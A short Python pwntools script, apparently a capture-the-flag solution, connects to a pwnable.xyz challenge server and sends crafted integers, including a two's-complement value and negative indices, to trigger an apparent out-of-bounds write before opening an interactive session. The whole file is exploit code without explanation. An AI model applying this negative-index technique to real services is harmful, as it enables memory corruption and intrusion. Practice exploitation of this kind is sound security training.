from pwn import *

p = remote('svc.pwnable.xyz', 30003)


in1 = int('0xB500000000000000',16)
#convert to 2's complement
neg = 0xFFFFFFFFFFFFFFFF
in1 = neg - in1
in2 = 0
in3 = -6
print(in1)

p.send(str(-1*in1)+' ')
p.send(str(in2)+' ')
p.sendline(str(in3))
p.recvline()
in1 = int('0x0B000000',16)
print(in1)

#1122334455667788
#


in2 = 0
in3 = -5
p.send(str(in1)+' ')
p.send(str(in2)+' ')
p.sendline(str(in3))

p.interactive()